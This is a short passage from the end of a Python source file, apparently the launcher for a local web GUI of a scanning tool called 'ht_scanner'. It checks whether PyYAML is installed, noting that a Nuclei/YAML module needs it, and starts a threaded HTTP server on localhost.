    print(f"[*] ht_scanner GUI en http://127.0.0.1:{PORT}")
    if not HAS_YAML:
        print("[!] PyYAML no instalado: el modulo Nuclei/YAML no estara disponible.")
        print("    Instala con: pip install pyyaml")
    # ThreadingHTTPServer: cada conexion en su propio hilo (SSE no bloquea otras)
    HTTPServer.allow_reuse_address = True
    srv = ThreadingHTTPServer(("127.0.0.1", PORT), Handler)
    srv.serve_forever()


if __name__ == "__main__":
    run()
